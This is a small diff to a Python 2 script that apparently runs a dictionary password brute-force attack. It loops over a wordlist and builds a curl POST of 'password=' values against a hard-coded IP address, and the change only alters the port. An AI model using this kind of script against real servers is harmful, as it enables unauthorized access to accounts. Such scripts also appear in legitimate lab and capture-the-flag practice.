@@ -7,7 +7,7 @@ except Exception as e:
     print "Syntax: python " + sys.argv[0] + " /path/to/dictionary/"
     sys.exit()
 
-targetServer = "http://88.198.233.174:42090/"
+targetServer = "http://88.198.233.174:35080/"
 bruteCommand = 'curl -s --data "password='
 
 for password in passwordDictionary:
